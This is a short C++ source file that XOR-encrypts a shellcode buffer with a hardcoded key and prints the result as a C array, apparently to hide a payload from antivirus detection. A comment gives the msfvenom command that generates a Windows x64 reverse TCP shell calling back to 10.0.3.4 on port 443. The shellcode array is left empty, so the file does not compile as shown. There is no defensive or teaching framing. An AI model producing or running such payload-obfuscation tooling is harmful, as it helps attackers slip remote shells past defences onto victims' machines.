#include <iostream>
#include <iomanip>

unsigned char shellcode[] =
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f c -v shellcode

char key[] = "mysecretkey";

int main() {
    size_t key_len = sizeof(key) - 1; // exclude null terminator
    size_t shell_len = sizeof(shellcode);
    size_t j = 0;

    std::cout << "unsigned char encrypted_shellcode[" << shell_len << "] = {\n    ";
    for (size_t i = 0; i < shell_len; i++) {
        if (j == key_len) j = 0;
        unsigned char enc = shellcode[i] ^ key[j++];
        std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)enc;
        if (i < shell_len - 1) std::cout << ", ";
        if ((i + 1) % 16 == 0) std::cout << "\n    ";
    }
    std::cout << "\n};" << std::endl;

    return 0;
}
